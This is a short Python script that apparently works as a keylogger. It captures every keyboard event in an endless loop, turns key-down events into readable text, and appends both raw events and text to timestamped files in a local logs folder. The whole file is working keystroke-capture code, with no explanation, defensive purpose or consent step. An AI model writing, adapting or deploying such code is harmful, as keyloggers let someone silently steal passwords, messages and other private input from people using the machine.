from lib import keyboard    
from datetime import datetime   
import os   

def checkLogsPath(path):
    if os.path.exists(path) == False:
        os.mkdir(path)

def recording():
    return keyboard.read_event(suppress=True)
    

def calcualteDataAndHour():
    tempTime = datetime.now()
    return str(tempTime.strftime("%Y-%m-%d %H.%M.%S"))

def writeToFileRaw(lPath, lName, l):
    newLog = open(lPath + lName, "a")
    newLog.write(str(l))
    newLog.close()

def writeToFileText(lPath, lName, l):
    newLog = open(lPath + lName, "a")
    newLog.write(str(l))
    newLog.close()
def main():

    tempLogName = calcualteDataAndHour()
    logsPath = "logs/"

    checkLogsPath(logsPath)

    while True:
        tempLog = recording()
        strTempLogRaw = str(tempLog)
        strTempLog = ""

        if strTempLogRaw.find("down") != -1:
            if strTempLogRaw.find("space") != -1:
                strTempLog = " "
            else:
                strTempLog = strTempLogRaw.removeprefix("KeyboardEvent(")
                strTempLog = strTempLog.removesuffix(" down)")
        writeToFileRaw(logsPath,tempLogName+".raw",strTempLogRaw + "\n")
        writeToFileText(logsPath, tempLogName+".txt",strTempLog)


#########################
if __name__== "__main__":
   main()                
#########################